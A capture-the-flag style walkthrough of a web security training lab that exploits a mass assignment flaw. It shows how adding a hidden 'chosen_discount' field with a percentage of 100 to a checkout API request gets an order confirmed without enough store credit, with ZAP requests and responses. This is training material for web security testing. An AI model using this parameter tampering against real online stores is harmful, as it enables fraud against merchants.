# Lab: Exploiting a mass assignment vulnerability [OWASP Zed Attack Proxy]

In ZAP open built-in browser and navigate to the lab URL. Login with credentials `wiener:peter`.

Visit the product __Lightweight "l33t" Leather Jacket__ add it to cart and place the order.

In ZAP an endpoint `/cart?err=INSUFFICIENT_FUNDS` appears with a response that contains an error message `Not enough store credit for this purchase`. 

There are also two other requests `GET` and `POST` with the same endpoint `/api/checkout`. right click both and click __Open/Resend with Request Editor...__. Send the GET request.

_Response Body:_
```
{
  "chosen_discount":{
    "percentage":0
  },
  "chosen_products":[
    {
      "product_id":"1",
      "name":"Lightweight \"l33t\" Leather Jacket",
      "quantity":1,
      "item_price":133700
    }
  ]
}
```

The `chosen_discount` parameter isn't present the request body of the `POST /api/checkout` request:

```
{
  "chosen_products":[
    {
      "product_id":"1",
      "quantity":1
    }
  ]
}
```

Let's add it and resend the request:

_Request:_
```
POST https://0ab0002d037f1213811d0d2800ee00a5.web-security-academy.net/api/checkout HTTP/1.1
...
...

{
  "chosen_discount":{
    "percentage":0
  },
  "chosen_products":[
    {
      "product_id":"1",
      "quantity":1
    }
  ]
}
```

Sending this request causes no errors.

_Response:_

```
HTTP/1.1 201 Created
Location: /cart?err=INSUFFICIENT_FUNDS
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
```

If we change `"percentage"` value from `0` to `"x"` and resend the request, an error would appear:

_Response Body:_
```
{
  "error":"Key order: Key chosen_discount: Key percentage: string is not a number"
}
```

This indicates that the user input is being processed. Let's change `"percentage"` value to `100` and send the request to solve the lab. This time we received a response header `Location` with the value `/cart/order-confirmation?order-confirmed=true`:

```
HTTP/1.1 201 Created
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
```

> Return to the [original write-up](README.md)
